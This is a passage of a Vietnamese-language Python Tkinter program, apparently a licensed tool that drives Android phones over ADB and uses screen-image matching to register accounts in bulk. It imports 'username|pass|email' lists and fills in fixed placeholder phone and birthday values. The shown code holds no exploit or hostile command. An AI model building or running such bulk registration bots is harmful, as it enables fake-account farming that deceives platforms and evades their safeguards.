                        parent.columnconfigure(0, weight=1)
                        self.account_file_var = tk.StringVar(value="-")
                        self.account_total_var = tk.StringVar(value="0")
                        self.account_valid_var = tk.StringVar(value="0")
                        self.account_invalid_var = tk.StringVar(value="0")
                        self.account_success_var = tk.StringVar(value="0")
                        self.account_failed_var = tk.StringVar(value="0")
                        self.default_phone_var = tk.StringVar(value=str(self.config_data.get("default_phone", "0123456789")))
                        self.default_birthday_var = tk.StringVar(value=str(self.config_data.get("default_birthday", "01/01/1990")))
                        buttons = tk.Frame(parent, bg=THEME["panel"])
                        buttons.grid(row=0, column=0, sticky="ew")
                        self._button(buttons, "Import file dữ liệu", self.load_accounts_file, "primary").pack(side=tk.LEFT)
                        self._button(buttons, "Import lại", self.load_accounts_file, "secondary").pack(side=tk.LEFT, padx=(8, 0))
                        self._button(buttons, "Xem dòng lỗi", self.view_invalid_rows, "ghost").pack(side=tk.LEFT, padx=(8, 0))
                        tk.Label(parent, text="Tên file", bg=THEME["panel"], fg=THEME["muted"], font=("Segoe UI", 9)).grid(row=1, column=0, sticky="w", pady=(10, 0))
                        tk.Label(parent, textvariable=self.account_file_var, bg=THEME["panel"], fg=THEME["text"], font=("Segoe UI", 10, "bold"), wraplength=330, justify=tk.LEFT).grid(row=2, column=0, sticky="w")
                        tk.Label(parent, text="Định dạng: username|pass|email|tên nếu có", bg=THEME["panel"], fg=THEME["muted"], font=("Segoe UI", 8)).grid(row=3, column=0, sticky="w", pady=(4, 0))
                        metrics = tk.Frame(parent, bg=THEME["panel"])
                        metrics.grid(row=4, column=0, sticky="ew", pady=(8, 0))
                        metrics.columnconfigure(0, weight=1)
                        metrics.columnconfigure(1, weight=1)
                        self._metric(metrics, "Tổng dòng", self.account_total_var, 0, 0)
                        self._metric(metrics, "Dòng hợp lệ", self.account_valid_var, 0, 1)
                        self._metric(metrics, "Dòng lỗi", self.account_invalid_var, 1, 0)
                        self._metric(metrics, "Thành công", self.account_success_var, 1, 1)
                        self._metric(metrics, "Thất bại", self.account_failed_var, 2, 0)
                        defaults = tk.Frame(parent, bg=THEME["panel"])
                        defaults.grid(row=5, column=0, sticky="ew", pady=(8, 0))
                        tk.Label(defaults, text="Số điện thoại mặc định", bg=THEME["panel"], fg=THEME["muted"], font=("Segoe UI", 8)).grid(row=0, column=0, sticky="w")
                        tk.Label(defaults, textvariable=self.default_phone_var, bg=THEME["panel"], fg=THEME["green"], font=("Segoe UI", 10, "bold")).grid(row=0, column=1, sticky="w", padx=(8, 0))
                        tk.Label(defaults, text="Ngày sinh mặc định", bg=THEME["panel"], fg=THEME["muted"], font=("Segoe UI", 8)).grid(row=1, column=0, sticky="w", pady=(4, 0))
                        tk.Label(defaults, textvariable=self.default_birthday_var, bg=THEME["panel"], fg=THEME["green"], font=("Segoe UI", 10, "bold")).grid(row=1, column=1, sticky="w", padx=(8, 0), pady=(4, 0))
                        self._button(parent, "Mở file kết quả", self.open_result_file, "secondary").grid(row=6, column=0, sticky="ew", pady=(10, 0))
                    
                    def _build_settings_panel(self, parent):
                        parent.columnconfigure(1, weight=1)
                        self.sensitivity_var = tk.IntVar(value=85)
                        self.sensitivity_label_var = tk.StringVar(value="85%")
                        self.wait_time_var = tk.StringVar(value="15")
                        self.retry_var = tk.StringVar(value="2")
                        tk.Label(parent, text="Độ nhạy nhận diện", bg=THEME["panel"], fg=THEME["text"], font=("Segoe UI", 10, "bold")).grid(row=0, column=0, sticky="w")
                        tk.Label(parent, textvariable=self.sensitivity_label_var, bg=THEME["panel"], fg=THEME["green"], font=("Segoe UI", 10, "bold")).grid(row=0, column=2, sticky="e")
                        tk.Scale(parent, from_=50, to=99, orient=tk.HORIZONTAL, variable=self.sensitivity_var, showvalue=False, command=lambda _v: self.on_sensitivity_change(), bg=THEME["panel"], fg=THEME["text"], troughcolor=THEME["panel_soft"], activebackground=THEME["cyan"], highlightthickness=0).grid(row=1, column=0, columnspan=3, sticky="ew")
                        tk.Label(parent, text="Thời gian chờ mỗi bước", bg=THEME["panel"], fg=THEME["muted"], font=("Segoe UI", 9)).grid(row=2, column=0, sticky="w", pady=(8, 0))
                        tk.Entry(parent, textvariable=self.wait_time_var, bg=THEME["panel_alt"], fg=THEME["text"], insertbackground=THEME["text"], relief=tk.FLAT, width=7, justify=tk.CENTER).grid(row=2, column=1, sticky="w", pady=(8, 0))
                        tk.Label(parent, text="giây", bg=THEME["panel"], fg=THEME["muted"], font=("Segoe UI", 9)).grid(row=2, column=2, sticky="w", pady=(8, 0))
                        tk.Label(parent, text="Số lần thử lại khi không tìm thấy", bg=THEME["panel"], fg=THEME["muted"], font=("Segoe UI", 9)).grid(row=3, column=0, sticky="w", pady=(6, 0))
                        tk.Entry(parent, textvariable=self.retry_var, bg=THEME["panel_alt"], fg=THEME["text"], insertbackground=THEME["text"], relief=tk.FLAT, width=7, justify=tk.CENTER).grid(row=3, column=1, sticky="w", pady=(6, 0))
                    
                    def _build_action_point_panel(self, parent):
                        parent.columnconfigure(0, weight=1)
                        parent.rowconfigure(0, weight=1)
                        list_canvas = tk.Canvas(parent, bg=THEME["panel"], highlightthickness=0, height=300)
                        list_canvas.grid(row=0, column=0, sticky="nsew")
                        scrollbar = ttk.Scrollbar(parent, orient=tk.VERTICAL, command=list_canvas.yview)
                        scrollbar.grid(row=0, column=1, sticky="ns")
                        list_canvas.configure(yscrollcommand=scrollbar.set)
                        list_frame = tk.Frame(list_canvas, bg=THEME["panel"])
                        list_canvas.create_window((0, 0), window=list_frame, anchor=tk.NW)
                        list_frame.bind("<Configure>", lambda _e: list_canvas.configure(scrollregion=list_canvas.bbox("all")))
                        for index, (role, label) in enumerate(IMAGE_TEMPLATE_ROLES.items(), start=1):
                            row = tk.Frame(list_frame, bg=THEME["panel_alt"], highlightbackground=THEME["line"], highlightthickness=1)
                            row.pack(fill=tk.X, pady=3)
                            row.columnconfigure(1, weight=1)
                            tk.Label(row, text=str(index), bg=THEME["panel_alt"], fg=THEME["cyan"], width=3, font=("Segoe UI", 9, "bold")).grid(row=0, column=0, sticky="w", padx=(8, 4), pady=7)
                            tk.Label(row, text=label, bg=THEME["panel_alt"], fg=THEME["text"], font=("Segoe UI", 9, "bold")).grid(row=0, column=1, sticky="w", pady=7)
                            var = tk.StringVar(value="Chưa chọn")
                            self.action_status_vars[role] = var
                            status = tk.Label(row, textvariable=var, bg=THEME["panel_alt"], fg=THEME["red"], width=13, font=("Segoe UI", 8, "bold"))
                            status.grid(row=0, column=2, sticky="e", padx=6)
                            self.action_status_labels[role] = status
                            self._button(row, "Chọn mốc", lambda r=role: self.begin_action_point_selection(r), "secondary").grid(row=0, column=3, padx=(0, 4), pady=5)
                            self._button(row, "Kiểm tra", lambda r=role: self.check_action_point(r), "ghost").grid(row=0, column=4, padx=4, pady=5)
                            self._button(row, "Chọn lại", lambda r=role: self.begin_action_point_selection(r), "ghost").grid(row=0, column=5, padx=(4, 8), pady=5)
                        preview = tk.Frame(parent, bg=THEME["panel_alt"], highlightbackground=THEME["line"], highlightthickness=1)
                        preview.grid(row=1, column=0, columnspan=2, sticky="nsew", pady=(10, 0))
                        preview.columnconfigure(0, weight=1)
                        preview.rowconfigure(1, weight=1)
                        self.selection_var = tk.StringVar(value="Chọn một mốc, sau đó khoanh vùng trên ảnh màn hình.")
                        tk.Label(preview, textvariable=self.selection_var, bg=THEME["panel_alt"], fg=THEME["muted"], font=("Segoe UI", 9), wraplength=520, justify=tk.LEFT).grid(row=0, column=0, sticky="ew", padx=10, pady=(9, 5))
                        self.scanner_canvas = tk.Canvas(preview, background="#050b14", highlightthickness=0, height=230)
                        self.scanner_canvas.grid(row=1, column=0, sticky="nsew", padx=10, pady=(0, 8))
                        self.scanner_canvas.bind("<ButtonPress-1>", self.on_scanner_press)
                        self.scanner_canvas.bind("<B1-Motion>", self.on_scanner_drag)
                        self.scanner_canvas.bind("<ButtonRelease-1>", self.on_scanner_release)
                        self._button(preview, "Lưu mốc đang chọn", self.save_scanner_selection, "primary").grid(row=2, column=0, sticky="ew", padx=10, pady=(0, 10))
                    
                    def _build_device_panel(self, parent):
                        parent.columnconfigure(0, weight=1)
                        self.device_count_var = tk.StringVar(value="0 thiết bị đang kết nối")
                        self.device_hint_var = tk.StringVar(value="Chưa tìm thấy thiết bị. Hãy cắm thiết bị, bật quyền điều khiển và bấm Tìm thiết bị.")
                        self._button(parent, "Tìm thiết bị", self.refresh_devices, "success").grid(row=0, column=0, sticky="ew")
                        tk.Label(parent, textvariable=self.device_count_var, bg=THEME["panel"], fg=THEME["cyan"], font=("Segoe UI", 10, "bold")).grid(row=1, column=0, sticky="w", pady=(8, 2))
                        tk.Label(parent, textvariable=self.device_hint_var, bg=THEME["panel"], fg=THEME["muted"], font=("Segoe UI", 9), wraplength=390, justify=tk.LEFT).grid(row=2, column=0, sticky="w")
                        self.device_listbox = tk.Listbox(parent, selectmode=tk.EXTENDED, height=4, exportselection=False, bg=THEME["panel_alt"], fg=THEME["text"], selectbackground=THEME["purple"], selectforeground=THEME["text"], highlightthickness=1, highlightbackground=THEME["line"], bd=0, font=("Segoe UI", 9))
                        self.device_listbox.grid(row=3, column=0, sticky="ew", pady=(8, 0))
                        self.device_listbox.bind("<<ListboxSelect>>", lambda _e: self.update_dashboard_state())
                    
                    def _build_result_panel(self, parent):
                        parent.columnconfigure(0, weight=1)
                        self.result_success_var = tk.StringVar(value="0")
                        self.result_failed_var = tk.StringVar(value="0")
                        self.result_pending_var = tk.StringVar(value="0")
                        self.result_current_var = tk.StringVar(value="-")
                        self.result_step_var = tk.StringVar(value="-")
                        metrics = tk.Frame(parent, bg=THEME["panel"])
                        metrics.grid(row=0, column=0, sticky="ew")
                        metrics.columnconfigure(0, weight=1)
                        metrics.columnconfigure(1, weight=1)
                        self._metric(metrics, "Thành công", self.result_success_var, 0, 0)
                        self._metric(metrics, "Thất bại", self.result_failed_var, 0, 1)
                        self._metric(metrics, "Đang chờ", self.result_pending_var, 1, 0)
                        tk.Label(parent, text="Tài khoản hiện tại", bg=THEME["panel"], fg=THEME["muted"], font=("Segoe UI", 9)).grid(row=1, column=0, sticky="w", pady=(8, 0))
                        tk.Label(parent, textvariable=self.result_current_var, bg=THEME["panel"], fg=THEME["text"], font=("Segoe UI", 10, "bold"), wraplength=390, justify=tk.LEFT).grid(row=2, column=0, sticky="w")
                        tk.Label(parent, text="Bước hiện tại", bg=THEME["panel"], fg=THEME["muted"], font=("Segoe UI", 9)).grid(row=3, column=0, sticky="w", pady=(6, 0))
                        tk.Label(parent, textvariable=self.result_step_var, bg=THEME["panel"], fg=THEME["green"], font=("Segoe UI", 10, "bold")).grid(row=4, column=0, sticky="w")
                        buttons = tk.Frame(parent, bg=THEME["panel"])
                        buttons.grid(row=5, column=0, sticky="ew", pady=(10, 0))
                        self._button(buttons, "Mở file kết quả", self.open_result_file, "secondary").pack(side=tk.LEFT)
                        self._button(buttons, "Copy tài khoản thành công", self.copy_success_accounts, "secondary").pack(side=tk.LEFT, padx=(6, 0))
                        self._button(buttons, "Xem tài khoản lỗi", self.view_failed_accounts, "ghost").pack(side=tk.LEFT, padx=(6, 0))
                    
                    def _build_activity_panel(self, parent):
                        parent.columnconfigure(0, weight=1)
                        parent.rowconfigure(3, weight=1)
                        self.last_error_var = tk.StringVar(value="Chưa có lỗi.")
                        error_box = tk.Frame(parent, bg="#231221", highlightbackground=THEME["red"], highlightthickness=1)
                        error_box.grid(row=0, column=0, sticky="ew", pady=(0, 8))
                        tk.Label(error_box, text="Lỗi gần nhất", bg="#231221", fg=THEME["red"], font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=10, pady=(7, 2))
                        tk.Label(error_box, textvariable=self.last_error_var, bg="#231221", fg=THEME["text"], font=("Segoe UI", 9), wraplength=390, justify=tk.LEFT).pack(anchor="w", padx=10, pady=(0, 7))
                        filters = tk.Frame(parent, bg=THEME["panel"])
                        filters.grid(row=1, column=0, sticky="ew", pady=(0, 7))
                        self.filter_buttons = {}
                        for key, label in LOG_FILTERS.items():
                            button = self._button(filters, label, lambda k=key: self.set_log_filter(k), "secondary")
                            button.pack(side=tk.LEFT, padx=(0, 5))
                            self.filter_buttons[key] = button
                        tools = tk.Frame(parent, bg=THEME["panel"])
                        tools.grid(row=2, column=0, sticky="ew", pady=(0, 7))
                        self._button(tools, "Copy nhật ký", self.copy_logs, "secondary").pack(side=tk.LEFT)
                        self._button(tools, "Xóa nhật ký", self.clear_logs, "ghost").pack(side=tk.LEFT, padx=(8, 0))
                        self.log_text = ScrolledText(parent, height=11, wrap=tk.WORD, bg="#050b14", fg=THEME["text"], insertbackground=THEME["text"], relief=tk.FLAT, bd=0, font=("Consolas", 9))
                        self.log_text.grid(row=3, column=0, sticky="nsew")
                        self.log_text.configure(state=tk.DISABLED)
                        self.set_log_filter("all")
                    
                    def _build_bottom_bar(self):
                        bottom = tk.Frame(self, bg=THEME["panel_alt"], height=34)
                        bottom.grid(row=3, column=0, sticky="ew", padx=18, pady=(12, 12))
                        for index in range(7):
                            bottom.columnconfigure(index, weight=1)
                        self.bottom_connection_var = tk.StringVar(value="Kết nối: Chưa kết nối")
                        self.bottom_devices_var = tk.StringVar(value="Thiết bị: 0")
                        self.bottom_accounts_var = tk.StringVar(value="Tổng tài khoản: 0")
                        self.bottom_current_var = tk.StringVar(value="Tài khoản hiện tại: -")
                        self.bottom_step_var = tk.StringVar(value="Bước hiện tại: -")
                        self.bottom_runtime_var = tk.StringVar(value="Thời gian chạy: 00:00:00")
                        for col, var in enumerate((self.bottom_connection_var, self.bottom_devices_var, self.bottom_accounts_var, self.bottom_current_var, self.bottom_step_var, self.bottom_runtime_var, tk.StringVar(value=f"Version {APP_VERSION}"))):
                            tk.Label(bottom, textvariable=var, bg=THEME["panel_alt"], fg=THEME["muted"], font=("Segoe UI", 8, "bold")).grid(row=0, column=col, sticky="w", padx=8, pady=7)
                    
                    def _load_config_to_ui(self):
                        sensitivity = safe_percent(float(self.config_data.get("threshold", IMAGE_MATCH_DEFAULT_THRESHOLD)))
                        self.sensitivity_var.set(sensitivity)
                        self.sensitivity_label_var.set(f"{sensitivity}%")
                        self.wait_time_var.set(str(int(float(self.config_data.get("match_timeout", 15)))))
                        self.retry_var.set(str(int(self.config_data.get("retry_attempts", 2))))
                        self.default_phone_var.set(str(self.config_data.get("default_phone", "0123456789")))
                        self.default_birthday_var.set(str(self.config_data.get("default_birthday", "01/01/1990")))
                    
                    def collect_config_from_ui(self):
                        config_dict = dict(DEFAULT_CONFIG)
                        config_dict.update(self.config_data)
                        config_dict["threshold"] = max(1, min(99, int(self.sensitivity_var.get()))) / 100
                        try:
                            config_dict["match_timeout"] = float(self.wait_time_var.get().strip())
                            config_dict["retry_attempts"] = int(self.retry_var.get().strip())
                        except ValueError as exc:
                            raise AppError("Cài đặt nhận diện chưa hợp lệ.") from exc
                        if config_dict["match_timeout"] <= 0:
                            raise AppError("Thời gian chờ mỗi bước phải lớn hơn 0 giây.")
                        if config_dict["retry_attempts"] < 0:
                            raise AppError("Số lần thử lại không được nhỏ hơn 0.")
                        config_dict["default_phone"] = self.default_phone_var.get().strip() or "0123456789"
                        config_dict["default_birthday"] = self.default_birthday_var.get().strip() or "01/01/1990"
                        return config_dict
                    
                    def on_sensitivity_change(self):
                        value = int(self.sensitivity_var.get())
                        self.sensitivity_label_var.set(f"{value}%")
                        self.config_data["threshold"] = value / 100
                        self.update_dashboard_state()
                    
                    def action_state(self, role):
                        if self.action_point_state.get(role) == "warning":
                            return "warning"
                        entry = self.template_store.metadata.get(role)
                        if isinstance(entry, dict):
                            if entry.get("image_data"):
                                return "done"
                            image_file = entry.get("file") or f"{role}.png"
                            if (self.template_store.template_dir / image_file).exists():
                                return "done"
                        if self.template_store.template_path(role).exists():
                            return "done"
                        return "missing"
                    
                    def readiness(self):
                        states = {role: self.action_state(role) for role in IMAGE_TEMPLATE_ROLES}
                        prepared = sum(1 for state in states.values() if state == "done")
                        missing = []
                        if not self.license_active:
                            missing.append("kích hoạt license")
                        if not self.imported_accounts:
                            missing.append("import file dữ liệu")
                        if not self.selected_devices():
                            missing.append("tìm và chọn thiết bị")
                        missing_points = [IMAGE_TEMPLATE_ROLES[role] for role, state in states.items() if state != "done"]
                        if missing_points:
                            missing.append("chọn đủ mốc thao tác")
                        return prepared, missing, states
                    
                    def update_dashboard_state(self):
                        prepared, missing, states = self.readiness()
                        total_points = len(IMAGE_TEMPLATE_ROLES)
                        self.hero_progress.configure(value=prepared)
                        self.hero_steps_var.set(f"{prepared}/{total_points} mốc đã chuẩn bị")
                        if self.running:
                            self.hero_status_var.set("ĐANG ĐĂNG KÍ")
                            self.hero_reason_var.set("Quy trình đang chạy. Theo dõi bước hiện tại và lỗi gần nhất ngay trên màn hình.")
                            self.start_button.configure(text="ĐANG ĐĂNG KÍ...", state=tk.DISABLED)
                            self.pause_button.configure(state=tk.NORMAL)
                            self.stop_after_button.configure(state=tk.NORMAL)
                            self.stop_now_button.configure(state=tk.NORMAL)
                        elif not missing:
                            self.hero_status_var.set("SẴN SÀNG")
                            self.hero_reason_var.set("Tất cả dữ liệu, thiết bị và mốc thao tác đã sẵn sàng.")
                            self.start_button.configure(text="BẮT ĐẦU ĐĂNG KÍ", state=tk.NORMAL)
                            self.pause_button.configure(state=tk.DISABLED)
                            self.stop_after_button.configure(state=tk.DISABLED)
                            self.stop_now_button.configure(state=tk.DISABLED)
                        else:
                            self.hero_status_var.set("CHƯA SẴN SÀNG")
                            self.hero_reason_var.set("Bạn cần " + ", ".join(missing) + " trước.")
                            self.start_button.configure(text="BẮT ĐẦU ĐĂNG KÍ", state=tk.DISABLED)
                            self.pause_button.configure(state=tk.DISABLED)
                            self.stop_after_button.configure(state=tk.DISABLED)
                            self.stop_now_button.configure(state=tk.DISABLED)
                        for role, var in self.action_status_vars.items():
                            state = states.get(role, "missing")
                            label = self.action_status_labels[role]
                            if state == "done":
                                var.set("Đã chọn")
                                label.configure(fg=THEME["green"])
                            elif state == "warning":
                                var.set("Cần kiểm tra lại")
                                label.configure(fg=THEME["yellow"])
                            else:
                                var.set("Chưa chọn")
                                label.configure(fg=THEME["red"])
                        selected_count = len(self.selected_devices())
                        self.bottom_connection_var.set("Kết nối: Đã kết nối" if selected_count else "Kết nối: Chưa kết nối")
                        self.bottom_devices_var.set(f"Thiết bị: {selected_count}")
                        self.bottom_accounts_var.set(f"Tổng tài khoản: {len(self.imported_accounts)}")
                        self.result_pending_var.set(str(max(0, len(self.imported_accounts) - len(self.success_accounts) - len(self.failed_accounts))))
                        self.result_success_var.set(str(len(self.success_accounts)))
                        self.result_failed_var.set(str(len(self.failed_accounts)))
                        self.account_success_var.set(str(len(self.success_accounts)))
                        self.account_failed_var.set(str(len(self.failed_accounts)))
                        self.result_current_var.set(self.current_account_text)
                        self.result_step_var.set(self.current_step_text)
                        self.bottom_current_var.set(f"Tài khoản hiện tại: {self.current_account_text}")
                        self.bottom_step_var.set(f"Bước hiện tại: {self.current_step_text}")
                    
                    def set_workflow_step(self, key, status, hint=None):
                        self.workflow_state[key] = status
                        if hint:
                            self.workflow_hints[key] = hint
                        self.current_step_key = key if status == "active" else self.current_step_key
                        title_lookup = {item_key: title for item_key, title, _hint in REGISTRATION_WORKFLOW}
                        if status == "active":
                            self.current_step_text = title_lookup.get(key, "-")
                        for row_key, widgets in self.workflow_rows.items():
                            frame = widgets["frame"]
                            icon = widgets["icon"]
                            title = widgets["title"]
                            hint_label = widgets["hint"]
                            row_status = self.workflow_state.get(row_key, "pending")
                            row_hint = self.workflow_hints.get(row_key, "")
                            if row_status == "active":
                                frame.configure(bg=THEME["panel_soft"], highlightbackground=THEME["cyan"])
                                icon.configure(text="▶", bg=THEME["panel_soft"], fg=THEME["cyan"])
                                title.configure(bg=THEME["panel_soft"], fg=THEME["text"])
                                hint_label.configure(text=row_hint, bg=THEME["panel_soft"], fg=THEME["cyan"])
                            elif row_status == "done":
                                frame.configure(bg=THEME["panel_alt"], highlightbackground=THEME["green"])
                                icon.configure(text="✓", bg=THEME["panel_alt"], fg=THEME["green"])
                                title.configure(bg=THEME["panel_alt"], fg=THEME["text"])
                                hint_label.configure(text=row_hint, bg=THEME["panel_alt"], fg=THEME["muted"])
                            elif row_status == "error":
                                frame.configure(bg="#231221", highlightbackground=THEME["red"])
                                icon.configure(text="!", bg="#231221", fg=THEME["red"])
                                title.configure(bg="#231221", fg=THEME["text"])
                                hint_label.configure(text=row_hint or "Bước này đang gặp lỗi.", bg="#231221", fg=THEME["red"])
                            else:
                                frame.configure(bg=THEME["panel_alt"], highlightbackground=THEME["line"])
                                icon_text = str([item_key for item_key, _title, _hint in REGISTRATION_WORKFLOW].index(row_key) + 1)
                                icon.configure(text=icon_text, bg=THEME["panel_alt"], fg=THEME["cyan"])
                                title.configure(bg=THEME["panel_alt"], fg=THEME["text"])
                                hint_label.configure(text=row_hint, bg=THEME["panel_alt"], fg=THEME["muted"])
                        self.update_dashboard_state()
                    
                    def refresh_action_points(self):
                        self.template_store = TemplateStore()
                        self.update_dashboard_state()
                    
                    def log(self, message, level="success"):
                        self.ui_queue.put(("log", {"message": message, "level": level}))
                    
                    def drain_ui_queue(self):
                        try:
                            while True:
                                kind, payload = self.ui_queue.get_nowait()
                                if kind == "log":
                                    self.add_log_entry(payload["message"], payload.get("level", "success"))
                                elif kind == "workflow":
                                    key, status, hint = payload
                                    self.set_workflow_step(key, status, hint)
                                elif kind == "current_account":
                                    account = payload
                                    self.current_account_text = account.username if account else "-"
                                    self.update_dashboard_state()
                                elif kind == "account_done":
                                    account = payload
                                    self.success_accounts.append(account)
                                    self.append_result("SUCCESS", account, "Đăng kí thành công")
                                    self.add_log_entry(f"Đăng kí thành công tài khoản {account.username}.", "success")
                                    self.update_dashboard_state()
                                elif kind == "account_failed":
                                    account, error = payload
                                    message = friendly_error(error)
                                    self.failed_accounts.append((account, message))
                                    self.append_result("FAILED", account, message)
                                    self.last_error_var.set(message)
                                    if self.current_step_key:
                                        self.set_workflow_step(self.current_step_key, "error", message)
                                    self.add_log_entry(message, "error")
                                    self.update_dashboard_state()
                                elif kind == "runner_done":
                                    self.runner_finished(payload)
                        except queue.Empty:
                            pass
                        self.after(120, self.drain_ui_queue)
                    
                    def add_log_entry(self, message, level="success"):
                        friendly = friendly_error(message)
                        if level not in {"success", "warning", "error"}:
                            level = "success"
                        entry = {"time": now_text(), "level": level, "message": friendly}
                        self.log_entries.append(entry)
                        append_log_file(f"[{entry['time']}] [{LOG_FILTERS.get(level, 'Thành công')}] {friendly}")
                        if level == "error":
                            self.last_error_var.set(friendly)
                        self.render_logs()
                    
                    def set_log_filter(self, key):
                        self.current_filter = key
                        for filter_key, button in self.filter_buttons.items():
                            button.configure(bg=THEME["purple"] if filter_key == key else THEME["panel_soft"], fg=THEME["text"])
                        self.render_logs()
                    
                    def render_logs(self):
                        if not hasattr(self, "log_text"):
                            return
                        self.log_text.configure(state=tk.NORMAL)
                        self.log_text.delete("1.0", tk.END)
                        for entry in self.log_entries:
                            if self.current_filter != "all" and entry["level"] != self.current_filter:
                                continue
                            self.log_text.insert(tk.END, f"{entry['time']}  {LOG_FILTERS.get(entry['level'], 'Thành công')}\n{entry['message']}\n\n")
                        self.log_text.see(tk.END)
                        self.log_text.configure(state=tk.DISABLED)
                    
                    def show_error(self, title, error):
                        message = friendly_error(error)
                        self.last_error_var.set(message)
                        self.add_log_entry(message, "error")
                        messagebox.showerror(title, message)
                        self.update_dashboard_state()
                    
                    def selected_devices(self, require_ready=True):
                        serials = []
                        for index in self.device_listbox.curselection():
                            if index >= len(self.devices):
                                continue
                            item = self.devices[index]
                            if require_ready and item.get("status") != "device":
                                continue
                            serials.append(item["serial"])
                        return serials
                    
                    def first_selected_device(self):
                        selected = self.selected_devices()
                        if not selected:
                            raise AppError("Chưa tìm thấy thiết bị. Hãy cắm thiết bị và bấm Tìm thiết bị.")
                        return selected[0]
                    
                    def load_accounts_file(self):
                        path = filedialog.askopenfilename(title="Import file dữ liệu", filetypes=[("File văn bản", "*.txt"), ("Tất cả file", "*.*")])
                        if not path:
                            return
                        try:
                            text = Path(path).read_text(encoding="utf-8", errors="replace")
                            accounts, invalid = parse_account_import(text)
                        except Exception as exc:
                            self.show_error("Không import được file", exc)
                            return
                        self.imported_accounts = accounts
                        self.invalid_accounts = invalid
                        self.success_accounts.clear()
                        self.failed_accounts.clear()
                        self.current_account_text = "-"
                        self.current_step_text = "-"
                        self.account_file_name = Path(path).name
                        self.account_file_var.set(self.account_file_name)
                        self.account_total_var.set(str(len(accounts) + len(invalid)))
                        self.account_valid_var.set(str(len(accounts)))
                        self.account_invalid_var.set(str(len(invalid)))
                        if accounts and invalid:
                            self.add_log_entry(f"Đã import {len(accounts)} dòng hợp lệ. Có {len(invalid)} dòng cần kiểm tra lại.", "warning")
                        elif accounts:
                            self.add_log_entry(f"Đã import {len(accounts)} dòng hợp lệ.", "success")
                        else:
                            self.add_log_entry("File dữ liệu chưa có dòng hợp lệ.", "error")
                        self.update_dashboard_state()
                    
                    def view_invalid_rows(self):
                        if not self.invalid_accounts:
                            messagebox.showinfo("Dòng lỗi", "Không có dòng lỗi định dạng.")
                            return
                        text = "\n".join(f"Dòng {number}: {line}" for number, line in self.invalid_accounts[:80])
                        messagebox.showwarning("Dòng lỗi", text)
                    
                    def refresh_devices(self):
                        try:
                            config_dict = self.collect_config_from_ui()
                            self.config_data = config_dict
                            devices = list_adb_devices(str(config_dict.get("adb_path", "adb")))
                        except Exception as exc:
                            self.show_error("Chưa tìm thấy thiết bị", exc)
                            return
                        self.devices = devices
                        self.device_display_names.clear()
                        self.device_listbox.delete(0, tk.END)
                        ready_count = 0
                        for index, item in enumerate(devices, start=1):
                            name = f"Thiết bị {index}"
                            self.device_display_names[item["serial"]] = name
                            ready = item.get("status") == "device"
                            ready_count += 1 if ready else 0
                            self.device_listbox.insert(tk.END, f"{name} - {'Sẵn sàng' if ready else 'Cần kiểm tra'}")
                            if ready:
                                self.device_listbox.selection_set(index - 1)
                        self.device_count_var.set(f"{ready_count} thiết bị đang kết nối")
                        self.device_hint_var.set("Thiết bị đã sẵn sàng." if ready_count else "Chưa tìm thấy thiết bị. Hãy cắm thiết bị, bật quyền điều khiển và bấm Tìm thiết bị.")
                        self.add_log_entry(f"Đã tìm thấy {ready_count} thiết bị sẵn sàng." if ready_count else "Chưa tìm thấy thiết bị. Hãy cắm thiết bị và bấm Tìm thiết bị.", "success" if ready_count else "warning")
                        self.update_dashboard_state()
                    
                    def begin_action_point_selection(self, role):
                        self.active_role = role
                        try:
                            config_dict = self.collect_config_from_ui()
                            device = self.first_selected_device()
                            screen = adb_screenshot_image(str(config_dict.get("adb_path", "adb")), device)
                            self.show_scanner_screen(screen)
                            self.selection_var.set(f"Đang chọn {IMAGE_TEMPLATE_ROLES[role]}. Hãy khoanh vùng rõ ràng trên ảnh màn hình.")
                            self.add_log_entry(f"Đã mở ảnh màn hình để chọn {IMAGE_TEMPLATE_ROLES[role]}.", "success")
                        except Exception as exc:
                            self.show_error("Không mở được ảnh màn hình", exc)
                    
                    def show_scanner_screen(self, screen):
                        cv2, _np = ensure_image_libraries()
                        Image, ImageTk = ensure_pillow_libraries()
                        self.scanner_screen = screen
                        self.scanner_selection = None
                        self.scanner_canvas.delete("all")
                        rgb = cv2.cvtColor(screen, cv2.COLOR_BGR2RGB)
                        image = Image.fromarray(rgb)
                        canvas_w = max(420, self.scanner_canvas.winfo_width())
                        canvas_h = max(220, self.scanner_canvas.winfo_height())
                        scale = min(canvas_w / image.width, canvas_h / image.height, 1.0)
                        display_w = max(1, int(round(image.width * scale)))
                        display_h = max(1, int(round(image.height * scale)))
                        if scale < 1.0:
                            image = image.resize((display_w, display_h), Image.LANCZOS)
                        self.scanner_scale = scale
                        self.scanner_display_size = (display_w, display_h)
                        self.scanner_photo = ImageTk.PhotoImage(image)
                        self.scanner_canvas.create_image(0, 0, image=self.scanner_photo, anchor=tk.NW)
                        self.scanner_canvas.configure(scrollregion=(0, 0, display_w, display_h))
                    
                    def clamp_canvas_point(self, x, y):
                        display_w, display_h = self.scanner_display_size
                        return max(0, min(display_w, x)), max(0, min(display_h, y))
                    
                    def on_scanner_press(self, event):
                        if self.scanner_screen is None:
                            return
                        x, y = self.clamp_canvas_point(int(event.x), int(event.y))
                        self.scanner_start = (x, y)
                        self.scanner_selection = None
                        if self.scanner_rect_id is not None:
                            self.scanner_canvas.delete(self.scanner_rect_id)
                        self.scanner_rect_id = self.scanner_canvas.create_rectangle(x, y, x, y, outline=THEME["green"], width=2)
                    
                    def on_scanner_drag(self, event):
                        if self.scanner_start is None or self.scanner_rect_id is None:
                            return
                        x, y = self.clamp_canvas_point(int(event.x), int(event.y))
                        x0, y0 = self.scanner_start
                        self.scanner_canvas.coords(self.scanner_rect_id, x0, y0, x, y)
                    
                    def on_scanner_release(self, event):
                        if self.scanner_start is None:
                            return
                        x, y = self.clamp_canvas_point(int(event.x), int(event.y))
                        x0, y0 = self.scanner_start
                        x1, x2 = sorted((x0, x))
                        y1, y2 = sorted((y0, y))
                        self.scanner_start = None
                        if abs(x2 - x1) < 4 or abs(y2 - y1) < 4:
                            self.scanner_selection = None
                            self.selection_var.set("Vùng chọn quá nhỏ. Hãy chọn vùng rõ hơn.")
                            return
                        self.scanner_selection = (x1, y1, x2, y2)
                        self.selection_var.set("Đã chọn vùng. Bấm Lưu mốc đang chọn để hoàn tất.")
                    
                    def save_scanner_selection(self):
                        try:
                            if self.scanner_screen is None or self.scanner_selection is None:
                                raise AppError("Bạn cần khoanh vùng trên ảnh màn hình trước.")
                            role = self.active_role
                            x1, y1, x2, y2 = self.scanner_selection
                            scale = self.scanner_scale or 1.0
